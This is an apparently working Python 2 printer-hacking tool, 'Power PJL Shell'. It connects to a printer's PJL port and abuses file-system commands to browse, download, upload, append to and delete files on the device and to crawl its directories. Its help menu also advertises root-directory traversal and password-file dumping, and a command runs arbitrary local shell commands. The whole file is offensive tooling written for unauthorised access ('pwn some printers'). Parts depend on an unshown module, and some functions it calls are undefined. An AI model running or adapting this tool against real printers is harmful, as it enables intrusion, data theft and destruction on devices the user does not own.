#!/usr/bin/env python
#
# printer hacking again in 2012
# classic 10years after :>

import os
import sys
import pjl_func

def usage():
	version = '0.3'
	print "Power PJL Shell by dash"
	print "~pwn some printers baby, version %s" % version
	print 
	print
	print "<host> [<port>]"

def help():
	#default fs commands
	print "Power PJL Shell"
	print
	print "PJL Commands:"
	print "cd	<path>		- change directory to path"	
	print "ls			- list current directory"
	print "dir			- list current directory"
	print "get	<file>		- get a file from printer"
	print "put	<file>		- put file to printer"
	print "del	<file>		- delete file from printer"
	print "cat	<file>		- cat a file"
	print "drive	<drive>		- change to drive(0,1,2,...)"
	print "mkdir	<dirname>	- create directory(not working?)"
	print "append	<file>		- append data to a file on printer"
	print

	#default info commands
	print "PJL Infos:"
	print "infosys			- print filesystem information"
	print "infoconf		- print config information"
	print "infomem			- info memory"
	print "infoid			- info id"
	print "infostat		- info status" 
	print "infovars		- info variables"
	print "infoustat		- info ustatus (buggy?!)"
	print

	#network commands
	print "Connection Options:"
	print "open	<printer> <port>- create new connection"
	print "close			- close connection"
	print "exit			- leave the shell"
	print

	#special commands
	print "Special Commands:"
	print "!r00tdir		- traverse to / of printer"
	print "!passwd			- print password file"
	print "spider	<dir>		- spider printer"
	print "!hackinfo		- show important data"
	print

	print "Host Commands:"
	print "!ls			- print files in ."
	print "!id			- show id of the current user"
	print "!! <cmd>		- execute abitrary command"
	print


def prompt(pjl):
	print "pjl@%s>" % (pjl.path),
	try:
		cmd = raw_input()
	
	except KeyboardInterrupt:
		cmd=""
		print "\nPlease use Exit"

	return cmd

def parseCmd(cmd):
	print "Command: %s" % cmd
	c = cmd.split(' ')
	return c

def executeCmd(pjl,cmd):
	print "Execute: %s" % cmd
	cmd0=cmd[0]	
	if cmd0=="!ls":
		buf = os.listdir(".")
		for entry in buf:
			print entry

	elif cmd0=="!id":
		buf = os.getuid()
		print buf
	
	elif cmd0=="!!":
		os.system(cmd[1])

	elif cmd0 == "help":
		help()
	elif cmd0 == "?":
		help()
	elif cmd0 == "infosys":
		infoFilesys(pjl)

	elif cmd0 == "infoconf":
		infoConf(pjl)

	elif cmd0 == "infomem":
		infoMem(pjl)

	elif cmd0 == "infoid":
		infoId(pjl)

	elif cmd0 == "infostatus":
		infoStatus(pjl)

	elif cmd0 == "infovars":
		infoVars(pjl)

	elif cmd0 == "infoustat":
		infoUStat(pjl)

	elif cmd0 == "exit":
		print "Cya"
	
	elif cmd0 == "open":
		#closing the connection
		pjl.s.close()

		#connecting
		print "Connecting: %s:%d" % (cmd[1], int(cmd[2]))
		pjl.host=cmd[1]
		pjl.port=int(cmd[2])
		openConnection(pjl)

	elif cmd0 == "close":
		pjl.s.close()

	elif cmd0 == "drive":
		if len(cmd)<2:
			print "drive <which>"
		else:
			pjl.drive=cmd[1]

	elif cmd0 == "stat":
		if len(cmd)<2:
			print "stat <what>"
			return
		fsQuery(pjl,cmd[1])

	elif cmd0 == "mkdir":
		if len(cmd)<2:
			print "mkdir <dir>"
		else:
			if cmd[1] != ".." and cmd[1]!=".":
				pjl.dFile=pjl.path+cmd[1]
				fsMkdir(pjl)
			else:
				print "Sorry .. / . not allowed"

	elif cmd0 == "get":
		if len(cmd)<2:
			print "get <file>"
		else:
			if cmd[1] != ".." and cmd[1]!=".":
				pjl.size=99999999
				pjl.dFile=pjl.path+cmd[1]
				fsUpload(pjl)
			else:
				print "Sorry .. / . not allowed"

	elif cmd0 == "cat":
		if len(cmd)<2:
			print "cat <file>"
		else:
			if cmd[1] != ".." and cmd[1]!=".":
				pjl.size=99999999
				pjl.dFile=pjl.path+cmd[1]
				catFile(pjl)
			else:
				print "Sorry .. / . not allowed"
	elif cmd0 == "spider":
		if len(cmd)<2:
			print "spider <dir>"
		else:
			if cmd[1] != ".." and cmd[1]!=".":
				pjl.size=99999999
				pjl.dFile=pjl.path+cmd[1]
				save3 = pjl.lDir
				save2 = pjl.dFile
				save = pjl.path
				pjl.walkTree(pjl.dFile)
				pjl.path=save
				pjl.dFile = save2
				pjl.lDir = save3
			else:
				print "Sorry .. / . not allowed"

	elif cmd0 == "put":
		if len(cmd)<2:
			print "put <file>"
		else:
			if cmd[1] != ".." and cmd[1]!=".":
				pjl.size=99999999
				pjl.dFile=pjl.path+cmd[1]
				pjl.hFile=cmd[1]
				print "Put: [%s]" % pjl.dFile
				fsDownload(pjl)
			else:
				print "Sorry .. / . not allowed"

	elif cmd0 == "append":
		if len(cmd)<3:
			print "append <file> <printerfile>"
		else:
			if (cmd[1] != ".." and cmd[1]!=".") and (cmd[2]) != ".." and cmd[2] != ".":
				pjl.size=99999999
				pjl.dFile=pjl.path+cmd[2]
				pjl.hFile=cmd[1]
				print "Put: [%s] to [%s]" % (pjl.hFile,pjl.dFile)
				fsAppend(pjl)
			else:
				print "Sorry .. / . not allowed"


	elif cmd0 == "del":
		if len(cmd)<2:
			print "del <file>"
		else:
			if cmd[1] != ".." and cmd[1]!=".":
				pjl.size=99999999
				pjl.dFile=pjl.path+cmd[1]
				fsDelete(pjl)
			else:
				print "Sorry .. / . not allowed"

	elif cmd0 == "dir" or cmd0 == "ls":
		if len(cmd)<2:
			fsDirlist(pjl,pjl.lDir)
		else:
			saveD = pjl.lDir
			d = pjl.lDir+cmd[1]
			fsDirlist(pjl,d)
			pjl.lDir=saveD

#	elif cmd0 == "ls":
#		if len(cmd)<2:
#			fsDirlist(pjl,pjl.lDir)
#		else:
#			saveD = pjl.lDir
#			d = pjl.lDir+cmd[1]
#			fsDirlist(pjl,d)
#			pjl.lDir=saveD

	elif cmd0 == "cd":
		if len(cmd)<2:
			pjl.lDir=pjl.home
			pjl.path=pjl.lDir
		else:
			saveD = pjl.lDir
			#here i should check with fsquery if is a dir and i have
			#permissions to access it
			if cmd[1] == '.':
				print "Ok, i stay here."
				return

			if cmd[1] == '..':
				tmp = pjl.lDir.split('/')
				print len(tmp)
				print tmp
				a=""
				for it in range(len(tmp)):
					#concat as long as its not the last entry
					#as we want to remove it :)
					if it+2 != len(tmp):
						#print it
						a = "%s%s/" % (a,tmp[it])
				a = a.replace('//','/')
				pjl.lDir = a
				pjl.path = pjl.lDir
				return 

			elif cmd[1].find('/') == -1:
				pjl.lDir = pjl.lDir+cmd[1]+"/"
				pjl.path = pjl.lDir
				
			else:
				pjl.lDir = pjl.lDir+cmd[1]
				pjl.path = pjl.lDir
			#if fsquery says its not accessable
			#pjl.lDir=saveD


	else:
		print "Nothing Baby!"

usage()
pjl = pjl_func.pjl_commands()

if len(sys.argv)<1:
	usage()
elif len(sys.argv)==2:
	host = sys.argv[1]
	pjl.host = host

elif len(sys.argv)==3:
	host = sys.argv[1]
	port = int(sys.argv[2])
	pjl.host = host
	pjl.port = port
else:
	print "Erm. What ya doing??"
	usage()
	sys.exit(-1)

pjl.saveData="tmp-download.file"


def openConnection(pjl):
	pjl.createSocket(pjl.host,pjl.port)
	return 0

def infoConf(pjl):
	pjl.buildRequest("infoconf")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	return 0

def infoFilesys(pjl):
	pjl.buildRequest("infofsys")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	pjl.parseFSQUERY()
	return 0

def infoMem(pjl):
	pjl.buildRequest("infomem")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	return 0

def infoUStat(pjl):
	pjl.buildRequest("infoustat")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	return 0

def infoVars(pjl):
	pjl.buildRequest("infovars")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	return 0

def infoStatus(pjl):
	pjl.buildRequest("infostatus")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	return 0

def infoId(pjl):
	pjl.buildRequest("infoid")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	return 0

def fsDownload(pjl):
	#check for local file
	ss = os.stat(pjl.hFile)
	ssize = ss[6]
	print "Filesize: %d" % ssize
	pjl.upSize=ssize
	pjl.size=ssize

	pjl.loadFile()

	pjl.buildRequest("fsdownload")
	pjl.sendRequest(pjl.req)
	pjl.size=ssize

	#delete buffer
	pjl.sBuf=""
	
	#put the data
	pjl.sendRequestSelect()
	print len(pjl.rBuf)

	return 0

def fsDelete(pjl):
	pjl.buildRequest("fsquery")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	pjl.parseFSQUERY()

	print pjl.dFile
	print pjl.size
	print pjl.drive

	pjl.buildRequest("fsdelete")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	
	return 0

def catFile(pjl):
	pjl.buildRequest("fsquery")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	pjl.parseFSQUERY()
	if pjl.error==1:
		print "Error, file not exist/accessable."
		return
	if pjl.ftype == "DIR":
		return

	pjl.downSize=pjl.size

	pjl.buildRequest("fsupload")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	#delete buffer
	pjl.rBuf=""
	
	#get the data
	pjl.recvRequestSelect()
	print len(pjl.rBuf)
	pjl.parseRequest()
	print "Cat:\n%s" % pjl.rBuf

	return 0

def fsUpload(pjl):
	pjl.buildRequest("fsquery")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	pjl.parseFSQUERY()
	if pjl.error==1:
		print "Error, file not exist/accessable."
		return

	pjl.downSize=pjl.size

	pjl.buildRequest("fsupload")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	#delete buffer
	pjl.rBuf=""
	
	#get the data
	pjl.recvRequestSelect()
	print len(pjl.rBuf)
	save = pjl.dFile.replace('/','_')
	pjl.saveData=save
	pjl.saveFile()

	return 0

def fsAppend(pjl):
	ss = os.stat(pjl.hFile)
	ssize = ss[6]
	print "Filesize: %d" % ssize
	pjl.upSize=ssize
	pjl.size=ssize

	pjl.loadFile()

	pjl.buildRequest("fsappend")
	pjl.sendRequest(pjl.req)
	pjl.size=ssize
	pjl.sBuf=""
	
	#put the data
	pjl.sendRequestSelect()
	print len(pjl.rBuf)

def fsQuery(pjl,dFile):
	pjl.dFile=dFile
	pjl.buildRequest("fsquery")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	pjl.recvRequest()
	pjl.parseRequest()
	
	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	pjl.parseFSQUERY()
	return 0

def fsMkdir(pjl):
	pjl.buildRequest("fsmkdir")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999

	return 0
def fsDirlist(pjl,lDir):
	pjl.lDir=lDir
	pjl.buildRequest("fsdirlist")
	pjl.sendRequest(pjl.req)
	pjl.size=9999999
	#pjl.recvRequestSelectNormal()
	pjl.recvRequest()
	pjl.parseRequest()

	print "Target: %s" % (pjl.host)
	print "Buffer: %s" % pjl.rBuf

	return 0

def initShell(pjl):
	openConnection(pjl)
	infoFilesys(pjl)
	getDrive(pjl)
	changeDirectory(pjl)
	listDirectory(pjl)


def putFile(pjl, lfile, rfile):
	print "implement me"
	
cmd=""
while cmd!="exit":
	openConnection(pjl)
	cmd=prompt(pjl)
	cmddata=parseCmd(cmd)
	result = executeCmd(pjl,cmddata)
	pjl.s.close()


